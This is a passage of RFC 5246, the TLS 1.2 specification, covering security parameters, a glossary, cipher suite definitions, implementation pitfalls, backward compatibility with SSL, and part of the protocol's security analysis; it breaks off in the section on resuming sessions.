   Note: The cipher suite values { 0x00, 0x1C } and { 0x00, 0x1D } are
   reserved to avoid collision with Fortezza-based cipher suites in
   SSL 3.

[A.6](#appendix-A.6).  The Security Parameters

   These security parameters are determined by the TLS Handshake
   Protocol and provided as parameters to the TLS record layer in order
   to initialize a connection state.  SecurityParameters includes:

   enum { null(0), (255) } CompressionMethod;

   enum { server, client } ConnectionEnd;

   enum { tls_prf_sha256 } PRFAlgorithm;

   enum { null, rc4, 3des, aes } BulkCipherAlgorithm;

   enum { stream, block, aead } CipherType;

   enum { null, hmac_md5, hmac_sha1, hmac_sha256, hmac_sha384,
     hmac_sha512} MACAlgorithm;

   /* Other values may be added to the algorithms specified in
   CompressionMethod, PRFAlgorithm, BulkCipherAlgorithm, and
   MACAlgorithm. */

   struct {
       ConnectionEnd          entity;
       PRFAlgorithm           prf_algorithm;
       BulkCipherAlgorithm    bulk_cipher_algorithm;
       CipherType             cipher_type;
       uint8                  enc_key_length;
       uint8                  block_length;
       uint8                  fixed_iv_length;
       uint8                  record_iv_length;
       MACAlgorithm           mac_algorithm;
       uint8                  mac_length;
       uint8                  mac_key_length;
       CompressionMethod      compression_algorithm;
       opaque                 master_secret[48];
       opaque                 client_random[32];
       opaque                 server_random[32];
   } SecurityParameters;

Dierks & Rescorla           Standards Track                    [Page 77]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[A.7](#appendix-A.7).  Changes to [RFC 4492](/doc/html/rfc4492)

   [RFC 4492](/doc/html/rfc4492) [[TLSECC](#ref-TLSECC)] adds Elliptic Curve cipher suites to TLS.  This
   document changes some of the structures used in that document.  This
   section details the required changes for implementors of both [RFC](/doc/html/rfc4492)
   [4492](/doc/html/rfc4492) and TLS 1.2.  Implementors of TLS 1.2 who are not implementing
   [RFC 4492](/doc/html/rfc4492) do not need to read this section.

   This document adds a "signature_algorithm" field to the digitally-
   signed element in order to identify the signature and digest
   algorithms used to create a signature.  This change applies to
   digital signatures formed using ECDSA as well, thus allowing ECDSA
   signatures to be used with digest algorithms other than SHA-1,
   provided such use is compatible with the certificate and any
   restrictions imposed by future revisions of [[PKIX](#ref-PKIX)].

   As described in Sections [7.4.2](#section-7.4.2) and [7.4.6](#section-7.4.6), the restrictions on the
   signature algorithms used to sign certificates are no longer tied to
   the cipher suite (when used by the server) or the
   ClientCertificateType (when used by the client).  Thus, the
   restrictions on the algorithm used to sign certificates specified in
   Sections [2](#section-2) and [3](#section-3) of [RFC 4492](/doc/html/rfc4492) are also relaxed.  As in this document,
   the restrictions on the keys in the end-entity certificate remain.

[Appendix B](#appendix-B).  Glossary

   Advanced Encryption Standard (AES)
      AES [[AES](#ref-AES)] is a widely used symmetric encryption algorithm.  AES is
      a block cipher with a 128-, 192-, or 256-bit keys and a 16-byte
      block size.  TLS currently only supports the 128- and 256-bit key
      sizes.

   application protocol
      An application protocol is a protocol that normally layers
      directly on top of the transport layer (e.g., TCP/IP).  Examples
      include HTTP, TELNET, FTP, and SMTP.

   asymmetric cipher
      See public key cryptography.

   authenticated encryption with additional data (AEAD)
      A symmetric encryption algorithm that simultaneously provides
      confidentiality and message integrity.

   authentication
      Authentication is the ability of one entity to determine the
      identity of another entity.

Dierks & Rescorla           Standards Track                    [Page 78]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   block cipher
      A block cipher is an algorithm that operates on plaintext in
      groups of bits, called blocks.  64 bits was, and 128 bits is, a
      common block size.

   bulk cipher
      A symmetric encryption algorithm used to encrypt large quantities
      of data.

   cipher block chaining (CBC)
      CBC is a mode in which every plaintext block encrypted with a
      block cipher is first exclusive-ORed with the previous ciphertext
      block (or, in the case of the first block, with the initialization
      vector).  For decryption, every block is first decrypted, then
      exclusive-ORed with the previous ciphertext block (or IV).

   certificate
      As part of the X.509 protocol (a.k.a. ISO Authentication
      framework), certificates are assigned by a trusted Certificate
      Authority and provide a strong binding between a party's identity
      or some other attributes and its public key.

   client
      The application entity that initiates a TLS connection to a
      server.  This may or may not imply that the client initiated the
      underlying transport connection.  The primary operational
      difference between the server and client is that the server is
      generally authenticated, while the client is only optionally
      authenticated.

   client write key
      The key used to encrypt data written by the client.

   client write MAC key
      The secret data used to authenticate data written by the client.

   connection
      A connection is a transport (in the OSI layering model definition)
      that provides a suitable type of service.  For TLS, such
      connections are peer-to-peer relationships.  The connections are
      transient.  Every connection is associated with one session.

   Data Encryption Standard
      DES [[DES](#ref-DES)] still is a very widely used symmetric encryption
      algorithm although it is considered as rather weak now.  DES is a
      block cipher with a 56-bit key and an 8-byte block size.  Note
      that in TLS, for key generation purposes, DES is treated as having
      an 8-byte key length (64 bits), but it still only provides 56 bits

Dierks & Rescorla           Standards Track                    [Page 79]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

      of protection.  (The low bit of each key byte is presumed to be
      set to produce odd parity in that key byte.)  DES can also be
      operated in a mode [[3DES](#ref-3DES)] where three independent keys and three
      encryptions are used for each block of data; this uses 168 bits of
      key (24 bytes in the TLS key generation method) and provides the
      equivalent of 112 bits of security.

   Digital Signature Standard (DSS)
      A standard for digital signing, including the Digital Signing
      Algorithm, approved by the National Institute of Standards and
      Technology, defined in NIST FIPS PUB 186-2, "Digital Signature
      Standard", published January 2000 by the U.S. Department of
      Commerce [[DSS](#ref-DSS)].  A significant update [[DSS-3](#ref-DSS-3)] has been drafted and
      was published in March 2006.

   digital signatures
      Digital signatures utilize public key cryptography and one-way
      hash functions to produce a signature of the data that can be
      authenticated, and is difficult to forge or repudiate.

   handshake An initial negotiation between client and server that
      establishes the parameters of their transactions.

   Initialization Vector (IV)
      When a block cipher is used in CBC mode, the initialization vector
      is exclusive-ORed with the first plaintext block prior to
      encryption.

   Message Authentication Code (MAC)
      A Message Authentication Code is a one-way hash computed from a
      message and some secret data.  It is difficult to forge without
      knowing the secret data.  Its purpose is to detect if the message
      has been altered.

   master secret
      Secure secret data used for generating encryption keys, MAC
      secrets, and IVs.

   MD5
      MD5 [[MD5](#ref-MD5)] is a hashing function that converts an arbitrarily long
      data stream into a hash of fixed size (16 bytes).  Due to
      significant progress in cryptanalysis, at the time of publication
      of this document, MD5 no longer can be considered a 'secure'
      hashing function.

Dierks & Rescorla           Standards Track                    [Page 80]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   public key cryptography
      A class of cryptographic techniques employing two-key ciphers.
      Messages encrypted with the public key can only be decrypted with
      the associated private key.  Conversely, messages signed with the
      private key can be verified with the public key.

   one-way hash function
      A one-way transformation that converts an arbitrary amount of data
      into a fixed-length hash.  It is computationally hard to reverse
      the transformation or to find collisions.  MD5 and SHA are
      examples of one-way hash functions.

   RC4
      A stream cipher invented by Ron Rivest.  A compatible cipher is
      described in [[SCH](#ref-SCH)].

   RSA
      A very widely used public key algorithm that can be used for
      either encryption or digital signing.  [[RSA](#ref-RSA)]

   server
      The server is the application entity that responds to requests for
      connections from clients.  See also "client".

   session
      A TLS session is an association between a client and a server.
      Sessions are created by the handshake protocol.  Sessions define a
      set of cryptographic security parameters that can be shared among
      multiple connections.  Sessions are used to avoid the expensive
      negotiation of new security parameters for each connection.

   session identifier
      A session identifier is a value generated by a server that
      identifies a particular session.

   server write key
      The key used to encrypt data written by the server.

   server write MAC key
      The secret data used to authenticate data written by the server.

   SHA
      The Secure Hash Algorithm [[SHS](#ref-SHS)] is defined in FIPS PUB 180-2.  It
      produces a 20-byte output.  Note that all references to SHA
      (without a numerical suffix) actually use the modified SHA-1
      algorithm.

Dierks & Rescorla           Standards Track                    [Page 81]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   SHA-256
      The 256-bit Secure Hash Algorithm is defined in FIPS PUB 180-2.
      It produces a 32-byte output.

   SSL
      Netscape's Secure Socket Layer protocol [[SSL3](#ref-SSL3)].  TLS is based on
      SSL Version 3.0.

   stream cipher
      An encryption algorithm that converts a key into a
      cryptographically strong keystream, which is then exclusive-ORed
      with the plaintext.

   symmetric cipher
      See bulk cipher.

   Transport Layer Security (TLS)
      This protocol; also, the Transport Layer Security working group of
      the Internet Engineering Task Force (IETF).  See "Working Group
      Information" at the end of this document (see page 99).

Dierks & Rescorla           Standards Track                    [Page 82]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[Appendix C](#appendix-C).  Cipher Suite Definitions

Cipher Suite                            Key        Cipher         Mac
                                        Exchange

TLS_NULL_WITH_NULL_NULL                 NULL         NULL         NULL
TLS_RSA_WITH_NULL_MD5                   RSA          NULL         MD5
TLS_RSA_WITH_NULL_SHA                   RSA          NULL         SHA
TLS_RSA_WITH_NULL_SHA256                RSA          NULL         SHA256
TLS_RSA_WITH_RC4_128_MD5                RSA          RC4_128      MD5
TLS_RSA_WITH_RC4_128_SHA                RSA          RC4_128      SHA
TLS_RSA_WITH_3DES_EDE_CBC_SHA           RSA          3DES_EDE_CBC SHA
TLS_RSA_WITH_AES_128_CBC_SHA            RSA          AES_128_CBC  SHA
TLS_RSA_WITH_AES_256_CBC_SHA            RSA          AES_256_CBC  SHA
TLS_RSA_WITH_AES_128_CBC_SHA256         RSA          AES_128_CBC  SHA256
TLS_RSA_WITH_AES_256_CBC_SHA256         RSA          AES_256_CBC  SHA256
TLS_DH_DSS_WITH_3DES_EDE_CBC_SHA        DH_DSS       3DES_EDE_CBC SHA
TLS_DH_RSA_WITH_3DES_EDE_CBC_SHA        DH_RSA       3DES_EDE_CBC SHA
TLS_DHE_DSS_WITH_3DES_EDE_CBC_SHA       DHE_DSS      3DES_EDE_CBC SHA
TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA       DHE_RSA      3DES_EDE_CBC SHA
TLS_DH_anon_WITH_RC4_128_MD5            DH_anon      RC4_128      MD5
TLS_DH_anon_WITH_3DES_EDE_CBC_SHA       DH_anon      3DES_EDE_CBC SHA
TLS_DH_DSS_WITH_AES_128_CBC_SHA         DH_DSS       AES_128_CBC  SHA
TLS_DH_RSA_WITH_AES_128_CBC_SHA         DH_RSA       AES_128_CBC  SHA
TLS_DHE_DSS_WITH_AES_128_CBC_SHA        DHE_DSS      AES_128_CBC  SHA
TLS_DHE_RSA_WITH_AES_128_CBC_SHA        DHE_RSA      AES_128_CBC  SHA
TLS_DH_anon_WITH_AES_128_CBC_SHA        DH_anon      AES_128_CBC  SHA
TLS_DH_DSS_WITH_AES_256_CBC_SHA         DH_DSS       AES_256_CBC  SHA
TLS_DH_RSA_WITH_AES_256_CBC_SHA         DH_RSA       AES_256_CBC  SHA
TLS_DHE_DSS_WITH_AES_256_CBC_SHA        DHE_DSS      AES_256_CBC  SHA
TLS_DHE_RSA_WITH_AES_256_CBC_SHA        DHE_RSA      AES_256_CBC  SHA
TLS_DH_anon_WITH_AES_256_CBC_SHA        DH_anon      AES_256_CBC  SHA
TLS_DH_DSS_WITH_AES_128_CBC_SHA256      DH_DSS       AES_128_CBC  SHA256
TLS_DH_RSA_WITH_AES_128_CBC_SHA256      DH_RSA       AES_128_CBC  SHA256
TLS_DHE_DSS_WITH_AES_128_CBC_SHA256     DHE_DSS      AES_128_CBC  SHA256
TLS_DHE_RSA_WITH_AES_128_CBC_SHA256     DHE_RSA      AES_128_CBC  SHA256
TLS_DH_anon_WITH_AES_128_CBC_SHA256     DH_anon      AES_128_CBC  SHA256
TLS_DH_DSS_WITH_AES_256_CBC_SHA256      DH_DSS       AES_256_CBC  SHA256
TLS_DH_RSA_WITH_AES_256_CBC_SHA256      DH_RSA       AES_256_CBC  SHA256
TLS_DHE_DSS_WITH_AES_256_CBC_SHA256     DHE_DSS      AES_256_CBC  SHA256
TLS_DHE_RSA_WITH_AES_256_CBC_SHA256     DHE_RSA      AES_256_CBC  SHA256
TLS_DH_anon_WITH_AES_256_CBC_SHA256     DH_anon      AES_256_CBC  SHA256

Dierks & Rescorla           Standards Track                    [Page 83]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

                        Key      IV   Block
Cipher        Type    Material  Size  Size
------------  ------  --------  ----  -----
NULL          Stream      0       0    N/A
RC4_128       Stream     16       0    N/A
3DES_EDE_CBC  Block      24       8      8
AES_128_CBC   Block      16      16     16
AES_256_CBC   Block      32      16     16

MAC       Algorithm    mac_length  mac_key_length
--------  -----------  ----------  --------------
NULL      N/A              0             0
MD5       HMAC-MD5        16            16
SHA       HMAC-SHA1       20            20
SHA256    HMAC-SHA256     32            32

   Type
      Indicates whether this is a stream cipher or a block cipher
      running in CBC mode.

   Key Material
      The number of bytes from the key_block that are used for
      generating the write keys.

   IV Size
      The amount of data needed to be generated for the initialization
      vector.  Zero for stream ciphers; equal to the block size for
      block ciphers (this is equal to
      SecurityParameters.record_iv_length).

   Block Size
      The amount of data a block cipher enciphers in one chunk; a block
      cipher running in CBC mode can only encrypt an even multiple of
      its block size.

Dierks & Rescorla           Standards Track                    [Page 84]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[Appendix D](#appendix-D).  Implementation Notes

   The TLS protocol cannot prevent many common security mistakes.  This
   section provides several recommendations to assist implementors.

[D.1](#appendix-D.1).  Random Number Generation and Seeding

   TLS requires a cryptographically secure pseudorandom number generator
   (PRNG).  Care must be taken in designing and seeding PRNGs.  PRNGs
   based on secure hash operations, most notably SHA-1, are acceptable,
   but cannot provide more security than the size of the random number
   generator state.

   To estimate the amount of seed material being produced, add the
   number of bits of unpredictable information in each seed byte.  For
   example, keystroke timing values taken from a PC compatible's 18.2 Hz
   timer provide 1 or 2 secure bits each, even though the total size of
   the counter value is 16 bits or more.  Seeding a 128-bit PRNG would
   thus require approximately 100 such timer values.

   [RANDOM] provides guidance on the generation of random values.

[D.2](#appendix-D.2).  Certificates and Authentication

   Implementations are responsible for verifying the integrity of
   certificates and should generally support certificate revocation
   messages.  Certificates should always be verified to ensure proper
   signing by a trusted Certificate Authority (CA).  The selection and
   addition of trusted CAs should be done very carefully.  Users should
   be able to view information about the certificate and root CA.

[D.3](#appendix-D.3).  Cipher Suites

   TLS supports a range of key sizes and security levels, including some
   that provide no or minimal security.  A proper implementation will
   probably not support many cipher suites.  For instance, anonymous
   Diffie-Hellman is strongly discouraged because it cannot prevent man-
   in-the-middle attacks.  Applications should also enforce minimum and
   maximum key sizes.  For example, certificate chains containing 512-
   bit RSA keys or signatures are not appropriate for high-security
   applications.

[D.4](#appendix-D.4).  Implementation Pitfalls

   Implementation experience has shown that certain parts of earlier TLS
   specifications are not easy to understand, and have been a source of
   interoperability and security problems.  Many of these areas have

Dierks & Rescorla           Standards Track                    [Page 85]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   been clarified in this document, but this appendix contains a short
   list of the most important things that require special attention from
   implementors.

   TLS protocol issues:

   -  Do you correctly handle handshake messages that are fragmented to
      multiple TLS records (see [Section 6.2.1](#section-6.2.1))? Including corner cases
      like a ClientHello that is split to several small fragments? Do
      you fragment handshake messages that exceed the maximum fragment
      size? In particular, the certificate and certificate request
      handshake messages can be large enough to require fragmentation.

   -  Do you ignore the TLS record layer version number in all TLS
      records before ServerHello (see [Appendix E.1](#appendix-E.1))?

   -  Do you handle TLS extensions in ClientHello correctly, including
      omitting the extensions field completely?

   -  Do you support renegotiation, both client and server initiated?
      While renegotiation is an optional feature, supporting it is
      highly recommended.

   -  When the server has requested a client certificate, but no
      suitable certificate is available, do you correctly send an empty
      Certificate message, instead of omitting the whole message (see
      [Section 7.4.6](#section-7.4.6))?

   Cryptographic details:

   -  In the RSA-encrypted Premaster Secret, do you correctly send and
      verify the version number? When an error is encountered, do you
      continue the handshake to avoid the Bleichenbacher attack (see
      [Section 7.4.7.1](#section-7.4.7.1))?

   -  What countermeasures do you use to prevent timing attacks against
      RSA decryption and signing operations (see [Section 7.4.7.1](#section-7.4.7.1))?

   -  When verifying RSA signatures, do you accept both NULL and missing
      parameters (see [Section 4.7](#section-4.7))? Do you verify that the RSA padding
      doesn't have additional data after the hash value?  [[FI06](#ref-FI06)]

   -  When using Diffie-Hellman key exchange, do you correctly strip
      leading zero bytes from the negotiated key (see [Section 8.1.2](#section-8.1.2))?

   -  Does your TLS client check that the Diffie-Hellman parameters sent
      by the server are acceptable (see Section F.1.1.3)?

Dierks & Rescorla           Standards Track                    [Page 86]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   -  How do you generate unpredictable IVs for CBC mode ciphers (see
      [Section 6.2.3.2](#section-6.2.3.2))?

   -  Do you accept long CBC mode padding (up to 255 bytes; see [Section](#section-6.2.3.2)
      [6.2.3.2](#section-6.2.3.2))?

   -  How do you address CBC mode timing attacks ([Section 6.2.3.2](#section-6.2.3.2))?

   -  Do you use a strong and, most importantly, properly seeded random
      number generator (see [Appendix D.1](#appendix-D.1)) for generating the premaster
      secret (for RSA key exchange), Diffie-Hellman private values, the
      DSA "k" parameter, and other security-critical values?

[Appendix E](#appendix-E).  Backward Compatibility

[E.1](#appendix-E.1).  Compatibility with TLS 1.0/1.1 and SSL 3.0

   Since there are various versions of TLS (1.0, 1.1, 1.2, and any
   future versions) and SSL (2.0 and 3.0), means are needed to negotiate
   the specific protocol version to use.  The TLS protocol provides a
   built-in mechanism for version negotiation so as not to bother other
   protocol components with the complexities of version selection.

   TLS versions 1.0, 1.1, and 1.2, and SSL 3.0 are very similar, and use
   compatible ClientHello messages; thus, supporting all of them is
   relatively easy.  Similarly, servers can easily handle clients trying
   to use future versions of TLS as long as the ClientHello format
   remains compatible, and the client supports the highest protocol
   version available in the server.

   A TLS 1.2 client who wishes to negotiate with such older servers will
   send a normal TLS 1.2 ClientHello, containing { 3, 3 } (TLS 1.2) in
   ClientHello.client_version.  If the server does not support this
   version, it will respond with a ServerHello containing an older
   version number.  If the client agrees to use this version, the
   negotiation will proceed as appropriate for the negotiated protocol.

   If the version chosen by the server is not supported by the client
   (or not acceptable), the client MUST send a "protocol_version" alert
   message and close the connection.

   If a TLS server receives a ClientHello containing a version number
   greater than the highest version supported by the server, it MUST
   reply according to the highest version supported by the server.

   A TLS server can also receive a ClientHello containing a version
   number smaller than the highest supported version.  If the server
   wishes to negotiate with old clients, it will proceed as appropriate

Dierks & Rescorla           Standards Track                    [Page 87]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   for the highest version supported by the server that is not greater
   than ClientHello.client_version.  For example, if the server supports
   TLS 1.0, 1.1, and 1.2, and client_version is TLS 1.0, the server will
   proceed with a TLS 1.0 ServerHello.  If server supports (or is
   willing to use) only versions greater than client_version, it MUST
   send a "protocol_version" alert message and close the connection.

   Whenever a client already knows the highest protocol version known to
   a server (for example, when resuming a session), it SHOULD initiate
   the connection in that native protocol.

   Note: some server implementations are known to implement version
   negotiation incorrectly.  For example, there are buggy TLS 1.0
   servers that simply close the connection when the client offers a
   version newer than TLS 1.0.  Also, it is known that some servers will
   refuse the connection if any TLS extensions are included in
   ClientHello.  Interoperability with such buggy servers is a complex
   topic beyond the scope of this document, and may require multiple
   connection attempts by the client.

   Earlier versions of the TLS specification were not fully clear on
   what the record layer version number (TLSPlaintext.version) should
   contain when sending ClientHello (i.e., before it is known which
   version of the protocol will be employed).  Thus, TLS servers
   compliant with this specification MUST accept any value {03,XX} as
   the record layer version number for ClientHello.

   TLS clients that wish to negotiate with older servers MAY send any
   value {03,XX} as the record layer version number.  Typical values
   would be {03,00}, the lowest version number supported by the client,
   and the value of ClientHello.client_version.  No single value will
   guarantee interoperability with all old servers, but this is a
   complex topic beyond the scope of this document.

[E.2](#appendix-E.2).  Compatibility with SSL 2.0

   TLS 1.2 clients that wish to support SSL 2.0 servers MUST send
   version 2.0 CLIENT-HELLO messages defined in [[SSL2](#ref-SSL2)].  The message
   MUST contain the same version number as would be used for ordinary
   ClientHello, and MUST encode the supported TLS cipher suites in the
   CIPHER-SPECS-DATA field as described below.

   Warning: The ability to send version 2.0 CLIENT-HELLO messages will
   be phased out with all due haste, since the newer ClientHello format
   provides better mechanisms for moving to newer versions and
   negotiating extensions.  TLS 1.2 clients SHOULD NOT support SSL 2.0.

Dierks & Rescorla           Standards Track                    [Page 88]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   However, even TLS servers that do not support SSL 2.0 MAY accept
   version 2.0 CLIENT-HELLO messages.  The message is presented below in
   sufficient detail for TLS server implementors; the true definition is
   still assumed to be [[SSL2](#ref-SSL2)].

   For negotiation purposes, 2.0 CLIENT-HELLO is interpreted the same
   way as a ClientHello with a "null" compression method and no
   extensions.  Note that this message MUST be sent directly on the
   wire, not wrapped as a TLS record.  For the purposes of calculating
   Finished and CertificateVerify, the msg_length field is not
   considered to be a part of the handshake message.

      uint8 V2CipherSpec[3];
      struct {
          uint16 msg_length;
          uint8 msg_type;
          Version version;
          uint16 cipher_spec_length;
          uint16 session_id_length;
          uint16 challenge_length;
          V2CipherSpec cipher_specs[V2ClientHello.cipher_spec_length];
          opaque session_id[V2ClientHello.session_id_length];
          opaque challenge[V2ClientHello.challenge_length;
      } V2ClientHello;

   msg_length
      The highest bit MUST be 1; the remaining bits contain the length
      of the following data in bytes.

   msg_type
      This field, in conjunction with the version field, identifies a
      version 2 ClientHello message.  The value MUST be 1.

   version
      Equal to ClientHello.client_version.

   cipher_spec_length
      This field is the total length of the field cipher_specs.  It
      cannot be zero and MUST be a multiple of the V2CipherSpec length
      (3).

   session_id_length
      This field MUST have a value of zero for a client that claims to
      support TLS 1.2.

Dierks & Rescorla           Standards Track                    [Page 89]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   challenge_length
      The length in bytes of the client's challenge to the server to
      authenticate itself.  Historically, permissible values are between
      16 and 32 bytes inclusive.  When using the SSLv2 backward-
      compatible handshake the client SHOULD use a 32-byte challenge.

   cipher_specs
      This is a list of all CipherSpecs the client is willing and able
      to use.  In addition to the 2.0 cipher specs defined in [[SSL2](#ref-SSL2)],
      this includes the TLS cipher suites normally sent in
      ClientHello.cipher_suites, with each cipher suite prefixed by a
      zero byte.  For example, the TLS cipher suite {0x00,0x0A} would be
      sent as {0x00,0x00,0x0A}.

   session_id
      This field MUST be empty.

   challenge
      Corresponds to ClientHello.random.  If the challenge length is
      less than 32, the TLS server will pad the data with leading (note:
      not trailing) zero bytes to make it 32 bytes long.

   Note: Requests to resume a TLS session MUST use a TLS client hello.

[E.3](#appendix-E.3).  Avoiding Man-in-the-Middle Version Rollback

   When TLS clients fall back to Version 2.0 compatibility mode, they
   MUST use special PKCS#1 block formatting.  This is done so that TLS
   servers will reject Version 2.0 sessions with TLS-capable clients.

   When a client negotiates SSL 2.0 but also supports TLS, it MUST set
   the right-hand (least-significant) 8 random bytes of the PKCS padding
   (not including the terminal null of the padding) for the RSA
   encryption of the ENCRYPTED-KEY-DATA field of the CLIENT-MASTER-KEY
   to 0x03 (the other padding bytes are random).

   When a TLS-capable server negotiates SSL 2.0 it SHOULD, after
   decrypting the ENCRYPTED-KEY-DATA field, check that these 8 padding
   bytes are 0x03.  If they are not, the server SHOULD generate a random
   value for SECRET-KEY-DATA, and continue the handshake (which will
   eventually fail since the keys will not match).  Note that reporting
   the error situation to the client could make the server vulnerable to
   attacks described in [[BLEI](#ref-BLEI)].

Dierks & Rescorla           Standards Track                    [Page 90]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

[Appendix F](#appendix-F).  Security Analysis

   The TLS protocol is designed to establish a secure connection between
   a client and a server communicating over an insecure channel.  This
   document makes several traditional assumptions, including that
   attackers have substantial computational resources and cannot obtain
   secret information from sources outside the protocol.  Attackers are
   assumed to have the ability to capture, modify, delete, replay, and
   otherwise tamper with messages sent over the communication channel.
   This appendix outlines how TLS has been designed to resist a variety
   of attacks.

[F.1](#appendix-F.1).  Handshake Protocol

   The handshake protocol is responsible for selecting a cipher spec and
   generating a master secret, which together comprise the primary
   cryptographic parameters associated with a secure session.  The
   handshake protocol can also optionally authenticate parties who have
   certificates signed by a trusted certificate authority.

[F.1.1](#appendix-F.1.1).  Authentication and Key Exchange

   TLS supports three authentication modes: authentication of both
   parties, server authentication with an unauthenticated client, and
   total anonymity.  Whenever the server is authenticated, the channel
   is secure against man-in-the-middle attacks, but completely anonymous
   sessions are inherently vulnerable to such attacks.  Anonymous
   servers cannot authenticate clients.  If the server is authenticated,
   its certificate message must provide a valid certificate chain
   leading to an acceptable certificate authority.  Similarly,
   authenticated clients must supply an acceptable certificate to the
   server.  Each party is responsible for verifying that the other's
   certificate is valid and has not expired or been revoked.

   The general goal of the key exchange process is to create a
   pre_master_secret known to the communicating parties and not to
   attackers.  The pre_master_secret will be used to generate the
   master_secret (see [Section 8.1](#section-8.1)).  The master_secret is required to
   generate the Finished messages, encryption keys, and MAC keys (see
   Sections [7.4.9](#section-7.4.9) and [6.3](#section-6.3)).  By sending a correct Finished message,
   parties thus prove that they know the correct pre_master_secret.

[F.1.1.1](#appendix-F.1.1.1).  Anonymous Key Exchange

   Completely anonymous sessions can be established using Diffie-Hellman
   for key exchange.  The server's public parameters are contained in
   the server key exchange message, and the client's are sent in the

Dierks & Rescorla           Standards Track                    [Page 91]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   client key exchange message.  Eavesdroppers who do not know the
   private values should not be able to find the Diffie-Hellman result
   (i.e., the pre_master_secret).

   Warning: Completely anonymous connections only provide protection
   against passive eavesdropping.  Unless an independent tamper-proof
   channel is used to verify that the Finished messages were not
   replaced by an attacker, server authentication is required in
   environments where active man-in-the-middle attacks are a concern.

[F.1.1.2](#appendix-F.1.1.2).  RSA Key Exchange and Authentication

   With RSA, key exchange and server authentication are combined.  The
   public key is contained in the server's certificate.  Note that
   compromise of the server's static RSA key results in a loss of
   confidentiality for all sessions protected under that static key.
   TLS users desiring Perfect Forward Secrecy should use DHE cipher
   suites.  The damage done by exposure of a private key can be limited
   by changing one's private key (and certificate) frequently.

   After verifying the server's certificate, the client encrypts a
   pre_master_secret with the server's public key.  By successfully
   decoding the pre_master_secret and producing a correct Finished
   message, the server demonstrates that it knows the private key
   corresponding to the server certificate.

   When RSA is used for key exchange, clients are authenticated using
   the certificate verify message (see [Section 7.4.8](#section-7.4.8)).  The client signs
   a value derived from all preceding handshake messages.  These
   handshake messages include the server certificate, which binds the
   signature to the server, and ServerHello.random, which binds the
   signature to the current handshake process.

[F.1.1.3](#appendix-F.1.1.3).  Diffie-Hellman Key Exchange with Authentication

   When Diffie-Hellman key exchange is used, the server can either
   supply a certificate containing fixed Diffie-Hellman parameters or
   use the server key exchange message to send a set of temporary
   Diffie-Hellman parameters signed with a DSA or RSA certificate.
   Temporary parameters are hashed with the hello.random values before
   signing to ensure that attackers do not replay old parameters.  In
   either case, the client can verify the certificate or signature to
   ensure that the parameters belong to the server.

   If the client has a certificate containing fixed Diffie-Hellman
   parameters, its certificate contains the information required to
   complete the key exchange.  Note that in this case the client and
   server will generate the same Diffie-Hellman result (i.e.,

Dierks & Rescorla           Standards Track                    [Page 92]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   pre_master_secret) every time they communicate.  To prevent the
   pre_master_secret from staying in memory any longer than necessary,
   it should be converted into the master_secret as soon as possible.
   Client Diffie-Hellman parameters must be compatible with those
   supplied by the server for the key exchange to work.

   If the client has a standard DSA or RSA certificate or is
   unauthenticated, it sends a set of temporary parameters to the server
   in the client key exchange message, then optionally uses a
   certificate verify message to authenticate itself.

   If the same DH keypair is to be used for multiple handshakes, either
   because the client or server has a certificate containing a fixed DH
   keypair or because the server is reusing DH keys, care must be taken
   to prevent small subgroup attacks.  Implementations SHOULD follow the
   guidelines found in [[SUBGROUP](#ref-SUBGROUP)].

   Small subgroup attacks are most easily avoided by using one of the
   DHE cipher suites and generating a fresh DH private key (X) for each
   handshake.  If a suitable base (such as 2) is chosen, g^X mod p can
   be computed very quickly; therefore, the performance cost is
   minimized.  Additionally, using a fresh key for each handshake
   provides Perfect Forward Secrecy.  Implementations SHOULD generate a
   new X for each handshake when using DHE cipher suites.

   Because TLS allows the server to provide arbitrary DH groups, the
   client should verify that the DH group is of suitable size as defined
   by local policy.  The client SHOULD also verify that the DH public
   exponent appears to be of adequate size.  [[KEYSIZ](#ref-KEYSIZ)] provides a useful
   guide to the strength of various group sizes.  The server MAY choose
   to assist the client by providing a known group, such as those
   defined in [[IKEALG](#ref-IKEALG)] or [[MODP](#ref-MODP)].  These can be verified by simple
   comparison.

[F.1.2](#appendix-F.1.2).  Version Rollback Attacks

   Because TLS includes substantial improvements over SSL Version 2.0,
   attackers may try to make TLS-capable clients and servers fall back
   to Version 2.0.  This attack can occur if (and only if) two TLS-
   capable parties use an SSL 2.0 handshake.

   Although the solution using non-random PKCS #1 block type 2 message
   padding is inelegant, it provides a reasonably secure way for Version
   3.0 servers to detect the attack.  This solution is not secure
   against attackers who can brute-force the key and substitute a new
   ENCRYPTED-KEY-DATA message containing the same key (but with normal
   padding) before the application-specified wait threshold has expired.
   Altering the padding of the least-significant 8 bytes of the PKCS

Dierks & Rescorla           Standards Track                    [Page 93]
```

---

```

[RFC 5246](/doc/html/rfc5246)                          TLS                        August 2008

   padding does not impact security for the size of the signed hashes
   and RSA key lengths used in the protocol, since this is essentially
   equivalent to increasing the input block size by 8 bytes.

[F.1.3](#appendix-F.1.3).  Detecting Attacks Against the Handshake Protocol

   An attacker might try to influence the handshake exchange to make the
   parties select different encryption algorithms than they would
   normally choose.

   For this attack, an attacker must actively change one or more
   handshake messages.  If this occurs, the client and server will
   compute different values for the handshake message hashes.  As a
   result, the parties will not accept each others' Finished messages.
   Without the master_secret, the attacker cannot repair the Finished
   messages, so the attack will be discovered.

[F.1.4](#appendix-F.1.4).  Resuming Sessions

   When a connection is established by resuming a session, new
